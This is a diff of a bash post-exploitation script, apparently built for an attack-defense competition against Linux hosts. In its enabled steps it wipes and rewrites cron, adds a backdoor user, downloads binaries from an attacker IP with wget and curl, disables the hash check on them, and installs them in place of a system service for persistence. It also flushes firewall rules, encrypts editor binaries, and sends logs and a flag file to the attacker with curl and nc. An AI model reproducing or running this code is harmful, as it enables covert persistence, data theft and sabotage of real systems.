@@ -4,18 +4,21 @@
 # control variables
 # -----------------
 ipv4="192.168.1.15" # of attacker
-serverPort=364 # of attacker
+serverPort=3640 # of attacker
 intelPort=44444 #port to send intel to on attacker box
 payloadFile="/var/upgrades" # if payload is running from a file, this is the file to write it to 
 payload="nc -lnvp 4444" # the payload to be written to the file above, bash, shellcode, etc
-allowedPorts=("22" "53")
+allowedPorts=("22" "53" "9001" "9002" "9003" "9004")
+downloadPort1="9002"
+downloadPort2="9003"
+downloadPort3="9004"
 logFile="/var/log/boot.log.0" # stealthily disguise log as legitimate log file. (boot.log always starts at .1)
 backdoorUsername="newUser"
 backdoorPassHash='$6$j8vzzMPeNMxOBoNf$B6Pb78gRwsaCxEx8zzEwG2bos08U3tEkXL1aryHd5iUy9iq0VgFxzFafqQezxFhFNBAY0Q0LmAUIUd2uDkm3A/' # use $6 -> most versatile
 firewallConfiguration=0
 scorebotUser="scorebot"  # name of scorebot user to avoid changing
-serviceName="service" # name of binary with service to backdoor
-
+serviceName1="service" # name of binary with service to backdoor
+serviceName2=""
 
 # --------------
 # back up hashes
@@ -100,7 +103,6 @@ hardenSsh() {
 
     
     # add our public key to the authorized_keys file for root
-    publicKey="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEtQ2rUqoG7+G3LUYwLCJOar008UlilwucCskQ9i8/8RsVnI3mJ59aWD7HP7yMshK+i6wXjbWDak5NX0KFQvZXLHFp+V5Qp5fD10gFEDaqfhf2CTepeCy50/1TTuCK/Q1EzGgjh3c+yDj1v7POR1uxIXPpnpmu3P9S8tOYDDC2pimmEqjMwq29Gjotlu+BS4ZTjH9dkbFlkoF3resrnyY+BztIAv/KUbQWP70+1xI73tFK9ubzpJi0Dcg3IfwdmEUtI8BbnF4q4/8pIObuzHfxnpe3/FTGp4tibYRsqTxdlckIFAcfI1SgZPnXyzaVDwH4HU4Seh4u+je3mAer5qK1pITLC7dgWt/+cpnLJ/2dXEJowuia8C3YZCJX21gyFPub3doCKqgQ/SmGi8IfDIWfm35YT7mU3862XC3bYrOqzKhvwA0lT69S8s4RtKkPKvWRJphGFwuuSrZOyfIP4Ew1EHScg4CzX4juUc1mU5Tmd7HWOTpBpHpfIn89bNle/eU= emile@EMILE-LT-UBU"
     mkdir -p /root/.ssh
     touch /root/.ssh/authorized_keys
     chown root /root/.ssh
@@ -216,23 +218,25 @@ shellBackdoor (){
 download_and_run (){  #find a place to put a backdoor and
         successTransfer=0
         transferMethod=1 # each number represents a different transfer method
-        targetFile="/tmp/revShell"
-        sourceFile="revShell"
-        sourceFileHash="944d981207838ac6b6fc940f09b93ab3169af4e3afe1ec085caab27d8022b737" # hash of the reverse shell we are transferring
+        targetFile="/usr/sbin/$1"
+        sourceFile=$1
+        #sourceFileHash="944d981207838ac6b6fc940f09b93ab3169af4e3afe1ec085caab27d8022b737" # hash of the reverse shell we are transferring
 
         echo -e "\n\ndownloading files from attacker" >> $logFile
         while [[ $transferMethod < 5 && $successTransfer == 0 ]];
         do
                 # transfer
                 if [ $transferMethod == 1 ]; then
-                    wget --no-check-certificate --tries=2 -O $targetFile http://$ipv4:$serverPort/$sourceFile                                                                                                      
+                    ip=$(ifconfig | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}')
+					echo $ip
+                    wget --bind-address=$ip:$downloadPort1 --no-check-certificate --tries=2 -O $targetFile http://$ipv4:$serverPort/$sourceFile                                                                                                      
                 elif [ $transferMethod == 2 ]; then
-                    curl -k -m 10 -o $targetFile https://$ipv4:$serverPort/$sourceFile >> $logFile 2>&1
+                    curl --local-port $downloadPort2 -m 10 -o $targetFile http://$ipv4:$serverPort/$sourceFile >> $logFile 2>&1
                 elif [ $transferMethod == 3 ]; then
                     echo -e "\n\ndownload via https failed, attempting download via http:" >> $logFile
                     wget --tries=2 -O $targetFile http://$ipv4:$serverPort/$sourceFile >> $logFile 2>&1
                 elif [ $transferMethod == 4 ]; then
-                    curl -m 10 -o $targetFile http://$ipv4:$serverPort/$sourceFile >> $logFile 2>&1
+                    curl --local-port $downloadPort3 -m 10 -o $targetFile http://$ipv4:$serverPort/$sourceFile >> $logFile 2>&1
                 # elif [ $transferMethod == 5 ]; then
                 #     echo "attempting download via nc:" >> $logFile
                 #     echo "GET /$sourceFile HTTP/1.0" | nc -n $ipv4 $serverPort > $targetFile && sed -i '1,7d' $targetFile >> $logFile 2>&1
@@ -244,12 +248,12 @@ download_and_run (){  #find a place to put a backdoor and
 
                 # verify
                 if [ -f $targetFile ]; then
-                    verifyHash=$(sha256sum $targetFile | cut --delimiter=" " --fields=1)
-                    if [ "$verifyHash" == "$sourceFileHash" ]; then
-                        successTransfer=1
-                    fi
-                else 
-                    successTransfer=0
+                #    verifyHash=$(sha256sum $targetFile | cut --delimiter=" " --fields=1)
+                #    if [ "$verifyHash" == "$sourceFileHash" ]; then
+                	successTransfer=1
+                #    fi
+                #else 
+                #    successTransfer=0
                 fi
                 ((transferMethod+=1))
         done;
@@ -258,7 +262,8 @@ download_and_run (){  #find a place to put a backdoor and
         else
                 echo -e "\n\ntransfer successful, running malware" >> $logFile 2>&1
                 chmod +x $targetFile
-                $targetFile >> $logFile 2>&1
+                
+                backdoorService $sourceFile $2 
         fi
 
         # take over a legitimate service for persistence for whatever the service is
@@ -330,15 +335,18 @@ backdoorUser(){
 # ------------------
 backdoorService(){
     dir="/lib/systemd/system"
-    binaryName=$(which $serviceName)
+    newbin=$1
+    
+    binaryName="/usr/sbin/$2"
+    serviceName=$2
+    
 
-
-    echo $binaryName
-    mv $binaryName $binaryName.bak
+    mv "/usr/sbin/$1" $binaryName
     rm $binaryName
-    touch $binaryName
-    cat $payload > $binaryName
-
+    mv $newbin $binaryName
+    chmod +x $binaryName
+    rm "$dir/$serviceName.service"
+    
     touch "$dir/$serviceName.service"
     echo "[Unit]" >> "$dir/$serviceName.service"   
     echo "Description=$serviceName secure server" >> "$dir/$serviceName.service"
@@ -399,16 +407,17 @@ configAllFirewalls(){ #tested
 configureIpTables() { #tested 
     # clear all iptables rules
     echo "## clearing rules" >> $logFile
+    iptables -L >> $logFile 2>&1
     iptables -F >> $logFile 2>&1
     iptables -X >> $logFile 2>&1
-    iptables -t nat -F >> $logFile 2>&1
-    iptables -t nat -X >> $logFile 2>&1
-    iptables -t mangle -F >> $logFile 2>&1
-    iptables -t mangle -X >> $logFile 2>&1
-    iptables -t raw -F >> $logFile 2>&1
-    iptables -t raw -X >> $logFile 2>&1
-    iptables -t security -F >> $logFile 2>&1
-    iptables -t security -X >> $logFile 2>&1
+    #iptables -t nat -F >> $logFile 2>&1
+    #iptables -t nat -X >> $logFile 2>&1
+    #iptables -t mangle -F >> $logFile 2>&1
+    #iptables -t mangle -X >> $logFile 2>&1
+    #iptables -t raw -F >> $logFile 2>&1
+    #iptables -t raw -X >> $logFile 2>&1
+    #iptables -t security -F >> $logFile 2>&1
+    #iptables -t security -X >> $logFile 2>&1
 
     #iterate through all chains and set the default policy to DROP
     #would include INPUT, FORWARD and any non-standard chains
@@ -511,8 +520,8 @@ configureFirewalld() { #tested
 # -----------------------
 binEncrypt() {
     # Array of binary names to encrypt
-    binaries=("sudo" "nano" "python3" "python" "php" "nc" "netcat" "tcpdump" "whoami" "ping" "sleep" "base64" "base32" "users" "kill" "pkill" "top" "ps" "netstat" "w" "chattr")
-    fake_output="Get wrecked"
+    binaries=("vi" "vim" "nano" "ed")
+    fake_output="command not found"
     encpassword="D0gsD0gsD0gs"
     
     # Loop through the binary names
@@ -558,12 +567,9 @@ report(){
     #checking nc and curl, create a third binary to send file contents for intel retrieval in case neither of these work. 
     if which curl >/dev/null 2>&1; then
         curl -X POST -k -d @$logFile https://$ipv4:$serverPort/report >> $logFile 2>&1
-        elif which nc >/dev/null 2>&1; then
-            cat $logFile | nc $ipv4 $serverPort
-        fi
-
-    
-    
+    elif which nc >/dev/null 2>&1; then
+        cat $logFile | nc $ipv4 $serverPort
+    fi
         
 }
 
@@ -572,7 +578,6 @@ report(){
 # -------------------------
 readFlag(){
     cat  $flagPath | nc $ipv4 $intelPort
-    chattr +i /flag.txt
 }
 
 main(){
@@ -593,23 +598,23 @@ main(){
     fi
     chmod +x $payloadFile
     
-    #wipeCron #tested
-    #writeCron
+    wipeCron #tested
+    writeCron
+    hashBackup #tested
+    backdoorUser #tested
+    hardenSsh
+    download_and_run backdoor $serviceName1
+    download_and_run intelGather $serviceName2
     
-    #hashBackup #tested
-    #backdoorUser #tested
-    #hardenSsh #tested
-    #download_and_run
     hardenUsers #tested
-    #backdoorService
-    #badAlias
-    #badSymlink
-    #configAllFirewalls
+    #backdoorService 
+    configAllFirewalls
     #shellBackdoor
     #readFlag
     #report
-    #binEncrypt
+    binEncrypt
     # systemctl reboot
 }
 
 main
+
